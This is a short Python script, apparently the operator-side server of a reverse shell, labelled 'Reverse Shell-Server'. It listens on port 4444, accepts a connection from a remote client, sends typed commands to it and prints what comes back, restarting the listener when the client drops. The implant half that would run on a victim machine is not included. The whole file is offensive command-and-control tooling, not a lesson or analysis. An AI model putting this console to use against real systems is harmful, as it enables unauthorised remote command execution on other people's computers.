import socket
import struct
import ctypes

def send_msg(socks, msg):
    msg = struct.pack(">I", len(msg)) + msg ##sends packed binary data that containts length of the msg and the msg itself##
    socks.sendall(msg) ##with format >Integer that packed format is numMsg like 3msg##

def recv_msg(socks):
    raw_msg = recvall(socks, 4)
    if not raw_msg:
        return None
    msglen = struct.unpack(">I", raw_msg)[0]
    return recvall(socks, msglen)

def recvall(sock,n):
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def listenExec():
    global conn
    global addr
    print("Shell Script Initialized")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("127.0.0.1", 4444))
    print("Listening for connections...\n")
    s.listen(1)
    conn, addr = s.accept()
    print("Connection Established!")
    while 1:
        try:
            cmd = input("\n$ ")
            if cmd == "quit":
                conn.close()
                exit(0)
            else: pass
            send_msg(conn,bytearray(cmd, "utf-8"))
            recv = recv_msg(conn)
            print(recv, end="\n")
        except socket.error:
            conn.close()
            print('Client Closed Trying Again...')
            listenExec()
        except TypeError:
            conn.close()
            print('Client Closed Trying Again...')
            listenExec()
        except AttributeError:
            conn.close()
            print('Client Closed Trying Again...')
            listenExec()
ctypes.windll.kernel32.SetConsoleTitleW("Reverse Shell-Server")
listenExec()
